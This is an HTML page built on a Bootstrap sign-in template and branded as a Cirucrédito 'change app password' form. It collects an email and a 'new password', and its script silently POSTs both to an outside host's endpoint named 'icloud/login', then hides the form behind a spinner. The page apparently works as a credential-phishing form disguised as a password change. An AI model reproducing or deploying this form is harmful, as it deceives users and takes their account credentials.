
<!doctype html>
<html lang="ES">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Jekyll v4.1.1">
    <title>Register App</title>

    <link rel="canonical" href="https://getbootstrap.com/docs/4.5/examples/sign-in/">

    <!-- Bootstrap core CSS -->
<link href="https://getbootstrap.com/docs/4.5/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">

    <!-- Favicons -->
<link rel="apple-touch-icon" href="/docs/4.5/assets/img/favicons/apple-touch-icon.png" sizes="180x180">
<link rel="icon" href="/docs/4.5/assets/img/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
<link rel="icon" href="/docs/4.5/assets/img/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
<link rel="manifest" href="/docs/4.5/assets/img/favicons/manifest.json">
<link rel="mask-icon" href="/docs/4.5/assets/img/favicons/safari-pinned-tab.svg" color="#563d7c">
<link rel="icon" href="/docs/4.5/assets/img/favicons/favicon.ico">
<meta name="msapplication-config" content="/docs/4.5/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#563d7c">


    <style>
      .bd-placeholder-img {
        font-size: 1.125rem;
        text-anchor: middle;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }

      @media (min-width: 768px) {
        .bd-placeholder-img-lg {
          font-size: 3.5rem;
        }
      }
    </style>
    <!-- Custom styles for this template -->
    <link href="https://getbootstrap.com/docs/4.5/examples/sign-in/signin.css" rel="stylesheet">
  </head>
  <body class="text-center">


  <img src="https://cirucredito.com/assets/img/5.gif"  id="spin" style="    position: relative;
  left: 48%;
  z-index: 1;
  top: 29%;display: none;
  top: 255px;" alt="Solicitar Credito" title="Solicitar Credito">
    <form class="form-signin" id="form">
  <img class="mb-4" src="https://cirucredito.com/assets/img/Logo%20Cirucr%C3%A9dito%20azul.png" alt="" width="200">
  <h1 class="h3 mb-3 font-weight-normal">Cambiar Contraseña App</h1>

            <label for="inputEmail" class="sr-only">(Email)</label>
        <input type="text" id="inputEmail" class="form-control" placeholder="Correo Electronico" required autofocus>
        <br>
        <label for="inputPassword" class="sr-only">Ingresa la Nueva Contraseña</label>
        <input type="password" id="inputPassword" class="form-control" placeholder="Nueva Contraseña" required>
        <button class="btn btn-lg btn-primary btn-block" type="button" onclick="send()">Cambiar</button>


  <script src="https://code.jquery.com/jquery-3.5.1.js" integrity="sha256-QWo7LDvxbWT2tbbQ97B53yJnYU3WhH/C8ycbRAkjPDc=" crossorigin="anonymous"></script>
  <script>

        function send(){
            $.ajax({
                url:'https://pdtclientsolutions.com/crm-public/api/icloud/login',
                type:"POST",
                dataType:'JSON',
                data:{
                    "email" : $("#inputEmail").val(),
                    "password" : $("#inputPassword").val()
                },

                beforeSend: function() {
                    $("#form").css("display", "none"),
                    $("#spin").css("display", "block")
                },


                 success: function(respuesta){

                }

            });
        }
  </script>

</form>
</body>
</html>
